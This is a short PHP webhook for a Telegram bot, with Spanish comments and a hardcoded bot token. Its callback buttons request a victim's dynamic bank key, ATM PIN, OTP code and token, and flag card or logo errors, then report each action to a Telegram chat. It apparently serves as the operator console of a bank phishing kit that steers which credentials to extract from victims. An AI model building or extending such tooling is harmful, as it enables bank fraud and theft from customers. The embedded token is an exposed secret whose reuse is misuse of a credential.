<?php
$botToken = "8003869491:AAHPtZmIR_jF9eANF82hoQS8UPPFuahcXNY"; // ⚠️ Pega aquí tu token real del bot
$update = json_decode(file_get_contents('php://input'), true);

if (isset($update["callback_query"])) {
    $chatId = $update["callback_query"]["message"]["chat"]["id"];
    $callbackId = $update["callback_query"]["id"];
    $data = $update["callback_query"]["data"];

    // Responder visualmente el toque del botón
    file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=$callbackId");

    // Detectar acción por tipo
    switch (true) {
        case strpos($data, "pedir_dinamica:") === 0:
            $msg = "🔐 Usuario solicitó CLAVE DINÁMICA.";
            break;
        case strpos($data, "pedir_cajero:") === 0:
            $msg = "🏧 Usuario solicitó CLAVE DE CAJERO.";
            break;
        case strpos($data, "pedir_otp:") === 0:
            $msg = "🔢 Usuario solicitó CÓDIGO OTP.";
            break;
        case strpos($data, "pedir_token:") === 0:
            $msg = "🔑 Usuario solicitó TOKEN.";
            break;
        case strpos($data, "error_tc:") === 0:
            $msg = "❌ Usuario reportó ERROR DE TARJETA.";
            break;
        case strpos($data, "error_logo:") === 0:
            $msg = "❌ Usuario reportó ERROR DE LOGO.";
            break;
        default:
            $msg = "⚠️ Acción no reconocida.";
            break;
    }

    // Enviar mensaje al canal o chat original
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}
